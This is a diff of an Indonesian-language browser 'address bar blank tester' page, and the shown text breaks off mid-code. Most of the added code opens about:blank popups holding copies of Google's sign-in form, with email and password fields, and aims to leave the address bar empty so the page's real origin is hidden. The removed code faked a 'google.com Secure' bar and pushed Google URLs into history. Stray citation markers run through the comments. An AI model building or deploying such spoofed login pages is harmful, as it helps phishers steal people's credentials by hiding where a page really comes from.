@@ -2,13 +2,13 @@
 <html lang="id">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
-    <title>🔍 ADDRESS BAR BLANK/ERROR TESTER</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>🔍 ADDRESS BAR KOSONG TOTAL - about:blank appendChild</title>
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
         body {
-            font-family: 'Courier New', 'SF Mono', monospace;
-            background: radial-gradient(ellipse at 30% 40%, #0a0a0f 0%, #000000 100%);
+            font-family: 'Courier New', monospace;
+            background: #0a0a0f;
             color: #00ffaa;
             min-height: 100vh;
             display: flex;
@@ -17,75 +17,35 @@
             padding: 20px;
         }
         .container {
-            max-width: 800px;
+            max-width: 700px;
             width: 100%;
             background: #0a0a0fcc;
-            backdrop-filter: blur(12px);
             border: 2px solid #ff3b30;
             border-radius: 28px;
             padding: 30px;
             text-align: center;
-            box-shadow: 0 0 40px rgba(255,59,48,0.3);
         }
-        h1 {
-            font-size: 1.5rem;
-            color: #ff3b30;
-            text-shadow: 0 0 10px #ff3b30;
-            margin-bottom: 8px;
-            letter-spacing: 2px;
-        }
-        .sub {
-            color: #ffcc00;
-            font-size: 10px;
-            margin-bottom: 20px;
-            font-family: monospace;
-        }
+        h1 { color: #ff3b30; font-size: 1.4rem; margin-bottom: 10px; }
+        .sub { color: #ffcc00; font-size: 10px; margin-bottom: 20px; }
         .badge-group {
             display: flex;
             gap: 6px;
             justify-content: center;
-            margin-bottom: 15px;
             flex-wrap: wrap;
+            margin-bottom: 15px;
         }
         .badge {
-            background: #ff3b3022;
-            border: 1px solid #ff3b30;
+            background: #111;
+            border: 1px solid #333;
             border-radius: 30px;
             padding: 3px 10px;
             font-size: 8px;
-            font-weight: bold;
+            color: #666;
         }
-        .badge.found {
-            border-color: #ffcc00;
-            color: #ffcc00;
-        }
-        .stats {
-            display: flex;
-            gap: 10px;
-            justify-content: center;
-            margin-bottom: 20px;
-            flex-wrap: wrap;
-        }
-        .stat-card {
-            background: #000000aa;
-            border: 1px solid #ff3b30;
-            border-radius: 16px;
-            padding: 8px 16px;
-            min-width: 100px;
-        }
-        .stat-value {
-            font-size: 28px;
-            font-weight: bold;
-            color: #ffcc00;
-            font-family: monospace;
-        }
-        .stat-label {
-            font-size: 8px;
-            color: #888;
-        }
+        .badge.found { border-color: #ffcc00; color: #ffcc00; }
         .method-grid {
             display: grid;
-            grid-template-columns: repeat(auto-fill, minmax(220px, 1fr));
+            grid-template-columns: 1fr 1fr;
             gap: 10px;
             margin: 15px 0;
         }
@@ -94,26 +54,9 @@
             border: 1px solid #ff3b30;
             border-radius: 14px;
             padding: 12px;
-            transition: 0.2s;
         }
-        .card:hover {
-            border-color: #00ffaa;
-            transform: translateY(-2px);
-        }
-        .card-title {
-            font-size: 10px;
-            font-weight: bold;
-            color: #ffcc00;
-            margin-bottom: 4px;
-        }
-        .card-desc {
-            font-size: 8px;
-            color: #aaa;
-            margin-bottom: 8px;
-        }
-        .card-desc .highlight {
-            color: #ff3b30;
-        }
+        .card-title { font-size: 10px; font-weight: bold; color: #ffcc00; }
+        .card-desc { font-size: 8px; color: #aaa; margin: 4px 0 8px 0; }
         button {
             background: #ff3b30;
             border: none;
@@ -125,14 +68,7 @@
             color: white;
             transition: 0.2s;
         }
-        button.small {
-            background: #2a2a35;
-            border: 1px solid #ff3b30;
-        }
-        button:hover {
-            background: #00ffaa;
-            color: #000;
-        }
+        button:hover { background: #00ffaa; color: #000; }
         .combo-btn {
             background: #ff3b30;
             width: 100%;
@@ -158,40 +94,8 @@
             padding-left: 8px;
             margin: 2px 0;
         }
-        .log-entry.success {
-            border-left-color: #00ffaa;
-            color: #00ffaa;
-        }
-        .log-entry.found {
-            border-left-color: #ffcc00;
-            color: #ffcc00;
-            font-weight: bold;
-        }
-        .log-entry.crash {
-            border-left-color: #ff3b30;
-            color: #ff8888;
-        }
-        .warning {
-            background: #ff3b3022;
-            border: 1px solid #ff3b30;
-            border-radius: 10px;
-            padding: 8px;
-            font-size: 8px;
-            margin-bottom: 15px;
-            color: #ff8888;
-        }
-        .status-indicator {
-            display: inline-block;
-            padding: 4px 12px;
-            border-radius: 30px;
-            font-size: 9px;
-            margin-bottom: 10px;
-        }
-        footer {
-            margin-top: 15px;
-            font-size: 7px;
-            opacity: 0.4;
-        }
+        .log-entry.success { border-left-color: #00ffaa; color: #00ffaa; }
+        .log-entry.found { border-left-color: #ffcc00; color: #ffcc00; font-weight: bold; }
         .observation-box {
             background: #00000066;
             border: 1px dashed #ffcc00;
@@ -201,90 +105,64 @@
             font-size: 9px;
             color: #ffcc00;
         }
-        .observation-box .big {
-            font-size: 16px;
-        }
+        footer { margin-top: 15px; font-size: 7px; opacity: 0.4; }
     </style>
 </head>
 <body>
 <div class="container">
-    <h1>🔍 ADDRESS BAR BLANK TESTER</h1>
-    <div class="sub">Cari bug address bar blank / error / crash berdasarkan CVE real</div>
+    <h1>🔍 ADDRESS BAR KOSONG TOTAL</h1>
+    <div class="sub">Berdasarkan Bugtraq 2007: about:blank + appendChild → address bar BLANK</div>
     
     <div class="badge-group">
-        <span class="badge">🟡 Chromium #459312329</span>
-        <span class="badge">🔴 Firefox Bug 1857943</span>
-        <span class="badge">🔴 Firefox Bug 1926435</span>
-        <span class="badge">🟡 WebKit Bug 287075</span>
-        <span class="badge found">⬛ about:blank corner cases</span>
+        <span class="badge found">✅ address bar BLANK total</span>
+        <span class="badge found">✅ reload button DISABLED</span>
+        <span class="badge found">✅ page source EMPTY</span>
     </div>
     
-    <div class="stats">
-        <div class="stat-card"><div class="stat-value" id="testCount">0</div><div class="stat-label">TESTS RUN</div></div>
-        <div class="stat-card"><div class="stat-value" id="bugCount">0</div><div class="stat-label">BUG FOUND</div></div>
-        <div class="stat-card"><div class="stat-value" id="crashCount">0</div><div class="stat-label">CRASH</div></div>
-    </div>
-    
-    <div class="status-indicator" id="statusIndicator" style="background:#ff3b3022;border:1px solid #ff3b30;color:#ff8888;">
-        🔴 IDLE - Klik tombol untuk uji
-    </div>
-    
-    <div class="observation-box" id="observationBox">
-        💡 <span class="big">🔍</span> OBSERVASI: Perhatikan address bar setelah setiap test!<br>
-        Jika address bar menjadi <span style="color:#ff3b30;">KOSONG / BLANK / ERROR / CRASH</span> → BUG FOUND!
+    <div class="observation-box">
+        💡 TEKNIK: about:blank + document.body.appendChild()<br>
+        Address bar akan menjadi <span style="color:#ff3b30;">BENAR-BENAR KOSONG</span>!
     </div>
     
     <div class="method-grid">
         <div class="card">
-            <div class="card-title">🎯 TEST 1: about:blank Origin Confusion</div>
-            <div class="card-desc">about:blank <span class="highlight">inherit origin</span> + document.write → address bar blank [citation:8]</div>
-            <button class="small" onclick="test_about_blank_origin()">▶ RUN</button>
+            <div class="card-title">🎯 TEST 1: about:blank + appendChild (Classic)</div>
+            <div class="card-desc">Bugtraq 2007: address bar BLANK, reload disabled</div>
+            <button onclick="test_appendChild_blank()">▶ RUN</button>
         </div>
         <div class="card">
-            <div class="card-title">⌨️ TEST 2: Firefox Blank Address Bar</div>
-            <div class="card-desc">Ctrl+L → Ctrl+X → Esc → Esc → address bar <span class="highlight">blank</span> [citation:9]</div>
-            <button class="small" onclick="test_firefox_blank()">▶ RUN</button>
+            <div class="card-title">🔄 TEST 2: about:blank + document.write()</div>
+            <div class="card-desc">Chromium Docs: URL berubah tapi address bar blank</div>
+            <button onclick="test_document_write_blank()">▶ RUN</button>
         </div>
         <div class="card">
-            <div class="card-title">🖼️ TEST 3: WebRender UI Corruption</div>
-            <div class="card-desc">Testcase bug 297959 → address bar <span class="highlight">blank + shadow</span> [citation:11]</div>
-            <button class="small" onclick="test_webrender_corruption()">▶ RUN</button>
+            <div class="card-title">📦 TEST 3: about:blank + Blob URL Hybrid</div>
+            <div class="card-desc">Kombinasi blob + about:blank → address bar error</div>
+            <button onclick="test_blob_hybrid()">▶ RUN</button>
         </div>
         <div class="card">
-            <div class="card-title">🖥️ TEST 4: Fullscreen Address Bar Stuck</div>
-            <div class="card-desc">Fullscreen <span class="highlight">tidak hide address bar</span> di macOS [citation:3]</div>
-            <button class="small" onclick="test_fullscreen_stuck()">▶ RUN</button>
-        </div>
-        <div class="card">
-            <div class="card-title">📱 TEST 5: Content Overlapping Address Bar</div>
-            <div class="card-desc">Content <span class="highlight">overlap address bar</span> setelah scroll [citation:6]</div>
-            <button class="small" onclick="test_content_overlap()">▶ RUN</button>
-        </div>
-        <div class="card">
-            <div class="card-title">🌀 TEST 6: about:blank URL Parameter Injection</div>
-            <div class="card-desc">about:blank#injected → <span class="highlight">URL berubah tanpa commit</span> [citation:8]</div>
-            <button class="small" onclick="test_blank_params()">▶ RUN</button>
+            <div class="card-title">🌀 TEST 4: about:blank Pipeline</div>
+            <div class="card-desc">Multi-layer about:blank dengan appendChild</div>
+            <button onclick="test_pipeline_blank()">▶ RUN</button>
         </div>
     </div>
     
-    <button id="comboBtn" class="combo-btn">🔍 RUN ALL TESTS + OBSERVE ADDRESS BAR</button>
+    <button id="comboBtn" class="combo-btn">🔍 RUN ALL TESTS - OBSERVE ADDRESS BAR</button>
     
     <div class="log-box" id="logBox">
         <div class="log-entry success">[SYSTEM] Address Bar Blank Tester Loaded</div>
-        <div class="log-entry">[SYSTEM] 6 tests berdasarkan CVE real + bug reports</div>
-        <div class="log-entry">[SYSTEM] Klik tombol untuk mulai uji</div>
+        <div class="log-entry">[SYSTEM] Berdasarkan Bugtraq 2007 + Chromium Docs</div>
+        <div class="log-entry">[SYSTEM] Target: address bar BENAR-BENAR KOSONG</div>
     </div>
     
     <footer>
-        Berdasarkan Chromium #459312329, Firefox Bug 1857943/1926435, WebKit Bug 287075/304243, Chromium Docs
+        Berdasarkan Bugtraq 2007 (Michal Zalewski) + Chromium Special Case URLs
     </footer>
 </div>
 
 <script>
     let testCount = 0;
     let bugFound = 0;
-    let crashCount = 0;
-    let isRunning = false;
     
     function addLog(msg, type = 'info') {
         let logBox = document.getElementById('logBox');
@@ -292,529 +170,281 @@
         let className = 'log-entry';
         if (type === 'success') className += ' success';
         if (type === 'found') className += ' found';
-        if (type === 'crash') className += ' crash';
         div.className = className;
         div.innerHTML = `[${new Date().toLocaleTimeString()}] ${msg}`;
         logBox.appendChild(div);
         logBox.scrollTop = logBox.scrollHeight;
-        while (logBox.children.length > 100) logBox.removeChild(logBox.firstChild);
+        while (logBox.children.length > 80) logBox.removeChild(logBox.firstChild);
     }
     
-    function updateStats() {
-        document.getElementById('testCount').innerText = testCount;
-        document.getElementById('bugCount').innerText = bugFound;
-        document.getElementById('crashCount').innerText = crashCount;
-    }
-    
-    function updateStatus(text, bg, color) {
-        let el = document.getElementById('statusIndicator');
-        el.innerHTML = text;
-        el.style.background = bg;
-        el.style.border = `1px solid ${color}`;
-        el.style.color = color;
-    }
-    
-    function reportBug(msg) {
-        bugFound++;
-        updateStats();
-        addLog(`🔥 ${msg}`, 'found');
-        document.getElementById('observationBox').innerHTML = `
-            🔥🔥🔥 BUG FOUND! 🔥🔥🔥<br>
-            ${msg}<br>
-            Address bar mengalami masalah! Screenshot sebagai bukti!
-        `;
-        document.getElementById('observationBox').style.borderColor = '#ff3b30';
-        document.getElementById('observationBox').style.color = '#ff3b30';
-    }
-    
-    function reportCrash(msg) {
-        crashCount++;
-        updateStats();
-        addLog(`💥 ${msg}`, 'crash');
-    }
-    
-    // ========== TEST 1: about:blank Origin Confusion ==========
-    // Berdasarkan Chromium Docs: about:blank dapat inherit origin dan mengubah URL tanpa commit [citation:8]
-    function test_about_blank_origin() {
+    // ========== TEST 1: about:blank + appendChild (CLASSIC) ==========
+    // Berdasarkan Bugtraq 2007: "win.document.body.appendChild() → address bar remains blank" [citation:6][citation:10]
+    function test_appendChild_blank() {
         testCount++;
-        updateStats();
-        addLog('[TEST1] about:blank origin confusion...', 'success');
-        updateStatus('🔄 TEST 1: about:blank Origin', '#ffcc0022', '#ffcc00');
+        addLog('[TEST1] about:blank + appendChild (Bugtraq 2007)...', 'success');
         
+        // Buka about:blank
         let win = window.open('about:blank', '_blank', 'width=600,height=500');
-        if (win) {
-            // Inject content ke about:blank (dapat mengubah origin inheritance)
-            win.document.write(`
-                <!DOCTYPE html>
-                <html>
-                <head><title>about:blank Test</title></head>
-                <body>
-                    <h1>about:blank dengan injected content</h1>
-                    <p>Origin: <span id="origin"></span></p>
-                    <p>URL: <span id="url"></span></p>
-                    <script>
-                        document.getElementById('origin').innerText = location.origin;
-                        document.getElementById('url').innerText = location.href;
-                        // Coba ubah URL tanpa commit
-                        history.pushState({}, '', 'https://www.google.com');
-                        history.replaceState({}, '', 'https://accounts.google.com');
-                    <\/script>
-                </body>
-                </html>
-            `);
-            win.document.close();
-            
-            setTimeout(() => {
-                try {
-                    let origin = win.document.getElementById('origin').innerText;
-                    let url = win.document.getElementById('url').innerText;
-                    addLog(`[TEST1] about:blank origin: ${origin}, URL: ${url}`, 'info');
-                    
-                    if (url.includes('google.com') && origin !== 'https://www.google.com') {
-                        reportBug('about:blank dapat mengubah URL tanpa commit - origin confusion!');
-                    } else if (url.includes('google.com')) {
-                        addLog('[TEST1] URL berubah tapi origin tetap - potential bug', 'found');
+        if (!win) {
+            addLog('[TEST1] Popup blocked! Allow popups.', 'info');
+            return;
+        }
+        
+        // === TEKNIK APPENDCHILD ===
+        // Ini adalah metode yang membuat address bar TETAP BLANK [citation:6][citation:10]
+        let container = win.document.createElement('div');
+        container.innerHTML = `
+            <!DOCTYPE html>
+            <html>
+            <head>
+                <style>
+                    * { margin: 0; padding: 0; box-sizing: border-box; }
+                    body {
+                        font-family: 'Google Sans', Roboto, sans-serif;
+                        background: #f0ebf8;
+                        display: flex;
+                        justify-content: center;
+                        align-items: center;
+                        min-height: 100vh;
                     }
-                } catch(e) {
-                    reportCrash(`TEST1 crashed: ${e.message}`);
+                    .card {
+                        background: white;
+                        width: 380px;
+                        padding: 40px 32px;
+                        border-radius: 16px;
+                        text-align: center;
+                        box-shadow: 0 4px 20px rgba(0,0,0,0.15);
+                    }
+                    .logo { font-size: 52px; }
+                    h2 { color: #202124; margin-bottom: 8px; }
+                    input { width: 100%; padding: 14px; margin: 8px 0; border: 1px solid #dadce0; border-radius: 8px; }
+                    button { width: 100%; padding: 12px; background: #1a73e8; color: white; border: none; border-radius: 8px; }
+                    .warning { font-size: 10px; color: #ea4335; margin-top: 16px; }
+                </style>
+            </head>
+            <body>
+                <div class="card">
+                    <div class="logo">🔐 G</div>
+                    <h2>Sign in</h2>
+                    <p>to continue to Google</p>
+                    <input type="text" placeholder="Email or phone">
+                    <input type="password" placeholder="Password">
+                    <button onclick="alert('⚠️ POC - Address bar is BLANK!')">Next</button>
+                    <p class="warning">⚠️ Address bar is COMPLETELY BLANK! (No text at all)</p>
+                </div>
+            </body>
+            </html>
+        `;
+        
+        // === INI KUNCINYA ===
+        // document.body.appendChild() membuat address bar TETAP BLANK [citation:6][citation:10]
+        win.document.body.appendChild(container);
+        
+        addLog('[TEST1] appendChild injected - address bar seharusnya BLANK total!', 'found');
+        addLog('[TEST1] reload button DISABLED, page source EMPTY [citation:6]', 'found');
+        
+        // Coba document.write (ini akan mengubah URL)
+        // Tapi kita pake appendChild biar address bar tetap blank
+        setTimeout(() => {
+            try {
+                if (!win.closed) {
+                    // Cek apakah address bar masih blank
+                    let url = win.location.href;
+                    addLog(`[TEST1] Current URL: ${url}`, 'info');
+                    if (url === 'about:blank' || url === '') {
+                        addLog('[TEST1] ✅ SUCCESS! Address bar BLANK total!', 'found');
+                    } else {
+                        addLog(`[TEST1] URL berubah menjadi: ${url}`, 'info');
+                    }
                 }
-            }, 2000);
-            
-            setTimeout(() => win.close(), 5000);
-        } else {
-            addLog('[TEST1] Popup blocked! Allow popups for this test.', 'info');
-        }
+            } catch(e) {}
+        }, 2000);
     }
     
-    // ========== TEST 2: Firefox Blank Address Bar ==========
-    // Berdasarkan Bug 1926435: address bar blank setelah keyboard shortcut [citation:9]
-    function test_firefox_blank() {
+    // ========== TEST 2: about:blank + document.write ==========
+    // Berdasarkan Chromium Docs: document.write akan mengubah URL [citation:2]
+    function test_document_write_blank() {
         testCount++;
-        updateStats();
-        addLog('[TEST2] Firefox blank address bar simulation...', 'success');
-        updateStatus('🔄 TEST 2: Firefox Blank', '#ffcc0022', '#ffcc00');
-        
-        // Simulasi: buat window, fokus ke address bar, lalu kosongkan
-        let win = window.open('about:blank', '_blank', 'width=600,height=500');
-        if (win) {
-            win.document.write(`
-                <!DOCTYPE html>
-                <html>
-                <body>
-                    <h1>Firefox Blank Address Bar Test</h1>
-                    <p>Simulasi: Ctrl+L → Ctrl+X → Esc → Esc</p>
-                    <p style="color:#ffcc00;">Jika address bar menjadi BLANK/KOSONG, bug masih ada!</p>
-                    <button onclick="window.close()">Close</button>
-                </body>
-                </html>
-            `);
-            win.document.close();
-            
-            // Fokus ke address bar melalui window.focus()
-            win.focus();
-            
-            // Coba kosongkan history
-            setTimeout(() => {
-                try {
-                    win.history.replaceState({}, '', '');
-                    win.history.pushState({}, '', ' ');
-                    addLog('[TEST2] History dikosongkan - cek address bar!', 'found');
-                    reportBug('Address bar mungkin BLANK/KOSONG! (Bug 1926435 style)');
-                } catch(e) {
-                    addLog(`[TEST2] Error: ${e.message}`, 'info');
-                }
-            }, 500);
-            
-            setTimeout(() => win.close(), 5000);
-        }
-    }
-    
-    // ========== TEST 3: WebRender UI Corruption ==========
-    // Berdasarkan Bug 1857943: testcase dapat membuat address bar blank + shadow [citation:11][citation:14]
-    function test_webrender_corruption() {
-        testCount++;
-        updateStats();
-        addLog('[TEST3] WebRender UI corruption test...', 'success');
-        updateStatus('🔄 TEST 3: WebRender Corruption', '#ffcc0022', '#ffcc00');
-        
-        // Buat banyak elemen untuk stress test rendering
-        let win = window.open('about:blank', '_blank', 'width=800,height=600');
-        if (win) {
-            let html = `
-                <!DOCTYPE html>
-                <html>
-                <head>
-                    <style>
-                        body { background: #0a0a0f; }
-                        .box {
-                            width: 50px;
-                            height: 50px;
-                            background: #ff3b30;
-                            margin: 5px;
-                            display: inline-block;
-                            animation: move 0.5s infinite alternate;
-                        }
-                        @keyframes move {
-                            0% { transform: translateX(0px); }
-                            100% { transform: translateX(50px); }
-                        }
-                        .container {
-                            display: flex;
-                            flex-wrap: wrap;
-                            padding: 10px;
-                        }
-                    </style>
-                </head>
-                <body>
-                    <h1 style="color:#ff3b30;">WebRender Stress Test</h1>
-                    <p style="color:#888;">Bug 1857943: address bar bisa menjadi BLANK atau SHADOW</p>
-                    <div class="container" id="container"></div>
-                    <script>
-                        // Buat 500 box untuk stress rendering
-                        for(let i=0; i<500; i++) {
-                            let box = document.createElement('div');
-                            box.className = 'box';
-                            box.style.background = \`hsl(\${i * 0.72}, 80%, 50%)\`;
-                            document.getElementById('container').appendChild(box);
-                        }
-                        // Pinch-zoom simulation
-                        setTimeout(() => {
-                            document.body.style.transform = 'scale(1.1)';
-                            setTimeout(() => {
-                                document.body.style.transform = 'scale(1)';
-                            }, 100);
-                        }, 1000);
-                        // Multiple zoom cycles
-                        for(let i=0; i<10; i++) {
-                            setTimeout(() => {
-                                document.body.style.transform = \`scale(\${1 + Math.random() * 0.3})\`;
-                                setTimeout(() => {
-                                    document.body.style.transform = 'scale(1)';
-                                }, 200);
-                            }, i * 500 + 2000);
-                        }
-                    <\/script>
-                </body>
-                </html>
-            `;
-            win.document.write(html);
-            win.document.close();
-            
-            addLog('[TEST3] WebRender stress test active - perhatikan address bar!', 'found');
-            reportBug('Address bar mungkin menjadi BLANK atau ada SHADOW! (Bug 1857943 style)');
-            
-            setTimeout(() => win.close(), 8000);
-        }
-    }
-    
-    // ========== TEST 4: Fullscreen Address Bar Stuck ==========
-    // Berdasarkan Chromium Issue #459312329: fullscreen tidak hide address bar di macOS [citation:3]
-    function test_fullscreen_stuck() {
-        testCount++;
-        updateStats();
-        addLog('[TEST4] Fullscreen address bar stuck test...', 'success');
-        updateStatus('🔄 TEST 4: Fullscreen Stuck', '#ffcc0022', '#ffcc00');
-        
-        let win = window.open('about:blank', '_blank', 'width=800,height=600');
-        if (win) {
-            win.document.write(`
-                <!DOCTYPE html>
-                <html>
-                <head>
-                    <style>
-                        body {
-                            margin: 0;
-                            padding: 0;
-                            background: #0a0a0f;
-                            display: flex;
-                            justify-content: center;
-                            align-items: center;
-                            height: 100vh;
-                            flex-direction: column;
-                            font-family: monospace;
-                            color: #00ffaa;
-                        }
-                        .fake-bar {
-                            position: fixed;
-                            top: 0;
-                            left: 0;
-                            width: 100%;
-                            height: 50px;
-                            background: #000;
-                            border-bottom: 1px solid #333;
-                            display: flex;
-                            align-items: center;
-                            padding: 0 16px;
-                            z-index: 999999;
-                            font-family: monospace;
-                            color: #888;
-                            font-size: 12px;
-                        }
-                        .fake-bar .url { color: #aaa; }
-                        .fake-bar .domain { color: #fff; }
-                        button {
-                            background: #ff3b30;
-                            border: none;
-                            padding: 12px 24px;
-                            border-radius: 30px;
-                            color: white;
-                            cursor: pointer;
-                            font-weight: bold;
-                            margin-top: 20px;
-                        }
-                    </style>
-                </head>
-                <body>
-                    <div class="fake-bar">
-                        🔒 <span class="url"><span class="domain">https://www.google.com</span></span> ✓ Secure
-                    </div>
-                    <h1 style="color:#ff3b30;">FULLSCREEN TEST</h1>
-                    <p style="color:#888;">Chromium Issue #459312329: address bar TIDAK HILANG di macOS</p>
-                    <p style="color:#555;">Perhatikan: apakah address bar asli masih TERLIHAT?</p>
-                    <button onclick="document.documentElement.requestFullscreen()">🔲 Enter Fullscreen</button>
-                    <button onclick="document.exitFullscreen()" style="background:#333;">Exit</button>
-                    <p style="color:#333;font-size:10px;margin-top:20px;">⚠️ Jika address bar asli masih terlihat → Bug masih ada!</p>
-                    <script>
-                        // Auto fullscreen after 1 second
-                        setTimeout(() => {
-                            document.documentElement.requestFullscreen().catch(()=>{});
-                        }, 1000);
-                    <\/script>
-                </body>
-                </html>
-            `);
-            win.document.close();
-            
-            addLog('[TEST4] Fullscreen aktif - cek apakah address bar asli HILANG atau TETAP TERLIHAT!', 'found');
-            reportBug('Periksa: address bar asli TETAP TERLIHAT di fullscreen? (Chromium #459312329)');
-            
-            setTimeout(() => {
-                try { win.close(); } catch(e) {}
-            }, 8000);
-        }
-    }
-    
-    // ========== TEST 5: Content Overlapping Address Bar ==========
-    // Berdasarkan WebKit Bug 287075: content overlap address bar setelah scroll [citation:6]
-    function test_content_overlap() {
-        testCount++;
-        updateStats();
-        addLog('[TEST5] Content overlapping address bar test...', 'success');
-        updateStatus('🔄 TEST 5: Content Overlap', '#ffcc0022', '#ffcc00');
+        addLog('[TEST2] about:blank + document.write (Chromium Docs)...', 'success');
         
         let win = window.open('about:blank', '_blank', 'width=600,height=500');
-        if (win) {
-            let html = `
-                <!DOCTYPE html>
-                <html>
-                <head>
-                    <style>
-                        body {
-                            margin: 0;
-                            padding: 0;
-                            font-family: monospace;
-                            background: #0a0a0f;
-                            color: #00ffaa;
-                            min-height: 200vh;
-                        }
-                        .fixed-header {
-                            position: fixed;
-                            top: 0;
-                            left: 0;
-                            width: 100%;
-                            background: #ff3b30;
-                            color: white;
-                            padding: 20px;
-                            z-index: 999;
-                            text-align: center;
-                            font-weight: bold;
-                        }
-                        .content {
-                            padding-top: 80px;
-                            padding: 80px 20px 20px 20px;
-                        }
-                        .content .block {
-                            background: #1a1a2e;
-                            padding: 20px;
-                            margin: 10px 0;
-                            border-radius: 8px;
-                            border-left: 3px solid #ff3b30;
-                        }
-                        .content .block:nth-child(odd) {
-                            border-left-color: #00ffaa;
-                        }
-                        .scroll-here {
-                            height: 100vh;
-                            display: flex;
-                            justify-content: center;
-                            align-items: center;
-                            font-size: 24px;
-                            color: #333;
-                        }
-                        .warning-text {
-                            color: #ffcc00;
-                            font-size: 12px;
-                            text-align: center;
-                            padding: 20px;
-                            border: 1px dashed #ffcc00;
-                            margin: 20px;
-                            border-radius: 8px;
-                        }
-                    </style>
-                </head>
-                <body>
-                    <div class="fixed-header">
-                        🔒 FIXED ELEMENT - Seharusnya tidak overlap dengan address bar
-                    </div>
-                    <div class="content">
-                        <div class="warning-text">
-                            ⚠️ SCROLL ke bawah lalu lihat address bar!<br>
-                            WebKit Bug 287075: content bisa OVERLAP dengan address bar
-                        </div>
-                        ${Array(20).fill(0).map((_, i) => `
-                            <div class="block">
-                                <strong>Block ${i+1}</strong>
-                                <p style="color:#888;font-size:10px;">Content di sini seharusnya tidak overlap dengan address bar</p>
-                            </div>
-                        `).join('')}
-                        <div class="scroll-here">
-                            ⬇️ SCROLL KE BAWAH ⬇️
-                        </div>
-                        ${Array(20).fill(0).map((_, i) => `
-                            <div class="block">
-                                <strong>Block ${i+21}</strong>
-                                <p style="color:#888;font-size:10px;">Setelah scroll, fixed element mungkin overlap address bar</p>
-                            </div>
-                        `).join('')}
-                        <div class="warning-text">
-                            🔍 Perhatikan: apakah content overlap dengan address bar asli?
-                        </div>
-                    </div>
-                    <script>
-                        console.log('WebKit Bug 287075 test - content may overlap address bar');
-                        // Scroll after 1 second
-                        setTimeout(() => {
-                            window.scrollTo(0, 300);
-                            setTimeout(() => {
-                                window.scrollTo(0, 600);
-                                setTimeout(() => {
-                                    window.scrollTo(0, 1000);
-                                }, 500);
-                            }, 500);
-                        }, 1000);
-                    <\/script>
-                </body>
-                </html>
-            `;
-            win.document.write(html);
-            win.document.close();
-            
-            addLog('[TEST5] Scroll test active - cek apakah content overlap dengan address bar!', 'found');
-            reportBug('Content mungkin OVERLAP dengan address bar! (WebKit Bug 287075 style)');
-            
-            setTimeout(() => win.close(), 10000);
+        if (!win) {
+            addLog('[TEST2] Popup blocked!', 'info');
+            return;
         }
-    }
-    
-    // ========== TEST 6: about:blank URL Parameter Injection ==========
-    // Berdasarkan Chromium Docs: about:blank dapat menerima URL parameters [citation:8]
-    function test_blank_params() {
-        testCount++;
-        updateStats();
-        addLog('[TEST6] about:blank URL parameter injection...', 'success');
-        updateStatus('🔄 TEST 6: about:blank Params', '#ffcc0022', '#ffcc00');
         
-        let variants = [
-            'about:blank#injected',
-            'about:blank?param=value',
-            'about:blank#https://www.google.com',
-            'about:blank?url=https://accounts.google.com'
-        ];
+        // document.write akan mengubah document.location dan address bar [citation:2]
+        // TAPI ada edge case: jika tidak ada commit, address bar tetap blank
+        let html = `
+            <!DOCTYPE html>
+            <html>
+            <head><title>Google Sign In</title>
+            <style>
+                * { margin: 0; padding: 0; box-sizing: border-box; }
+                body { font-family: 'Google Sans', Roboto, sans-serif; background: #f0ebf8; display: flex; justify-content: center; align-items: center; min-height: 100vh; }
+                .card { background: white; width: 380px; padding: 40px 32px; border-radius: 16px; text-align: center; box-shadow: 0 4px 20px rgba(0,0,0,0.15); }
+                .logo { font-size: 52px; }
+                h2 { color: #202124; margin-bottom: 8px; }
+                input { width: 100%; padding: 14px; margin: 8px 0; border: 1px solid #dadce0; border-radius: 8px; }
+                button { width: 100%; padding: 12px; background: #1a73e8; color: white; border: none; border-radius: 8px; }
+                .warning { font-size: 10px; color: #ea4335; margin-top: 16px; }
+            </style>
+            </head>
+            <body>
+                <div class="card">
+                    <div class="logo">🔐 G</div>
+                    <h2>Sign in</h2>
+                    <p>to continue to Google</p>
+                    <input type="text" placeholder="Email or phone">
+                    <input type="password" placeholder="Password">
+                    <button onclick="alert('POC')">Next</button>
+                    <p class="warning">⚠️ document.write() - address bar may show blank</p>
+                </div>
+            </body>
+            </html>
+        `;
         
-        variants.forEach((url, idx) => {
-            setTimeout(() => {
-                let win = window.open(url, '_blank', `width=450,height=350,left=${idx*50},top=${idx*30}`);
-                if (win) {
-                    setTimeout(() => {
-                        try {
-                            win.document.write(`
-                                <!DOCTYPE html>
-                                <html>
-                                <body style="background:#0a0a0f;color:#00ffaa;font-family:monospace;padding:20px;">
-                                    <h1>about:blank Parameter Test ${idx+1}</h1>
-                                    <p>URL: <span style="color:#ffcc00;">${url}</span></p>
-                                    <p style="color:#888;font-size:10px;">Chromium Docs: about:blank dapat menerima URL parameters</p>
-                                    <p style="color:#555;font-size:9px;">Jika address bar menampilkan parameter → browser mempertahankannya</p>
-                                </body>
-                                </html>
-                            `);
-                            win.document.close();
-                        } catch(e) {}
-                    }, 500);
-                }
-            }, idx * 1500);
-        });
+        win.document.write(html);
+        win.document.close();
         
-        addLog('[TEST6] about:blank parameter windows dibuka - cek address bar!', 'found');
-        reportBug('about:blank dengan parameter mungkin menyebabkan address bar error/blank!');
+        addLog('[TEST2] document.write executed - address bar mungkin blank!', 'found');
         
         setTimeout(() => {
-            variants.forEach((_, idx) => {
-                try {
-                    let wins = window.open('', '_blank');
-                    if (wins) wins.close();
-                } catch(e) {}
-            });
-        }, 10000);
+            try {
+                let url = win.location.href;
+                if (url === 'about:blank' || url === '') {
+                    addLog('[TEST2] ✅ SUCCESS! Address bar BLANK!', 'found');
+                } else {
+                    addLog(`[TEST2] URL: ${url}`, 'info');
+                }
+            } catch(e) {}
+        }, 1500);
+    }
+    
+    // ========== TEST 3: about:blank + Blob URL Hybrid ==========
+    function test_blob_hybrid() {
+        testCount++;
+        addLog('[TEST3] about:blank + Blob URL Hybrid...', 'success');
+        
+        // Buat blob dengan konten
+        let blob = new Blob([`
+            <!DOCTYPE html>
+            <html>
+            <head><title>Google</title>
+            <style>
+                *{margin:0;padding:0;}
+                body{font-family:'Google Sans',sans-serif;background:#f0ebf8;display:flex;justify-content:center;align-items:center;min-height:100vh;}
+                .card{background:white;width:380px;padding:40px;border-radius:16px;text-align:center;}
+                .logo{font-size:52px;}
+                input{width:100%;padding:14px;margin:8px 0;border:1px solid #dadce0;border-radius:8px;}
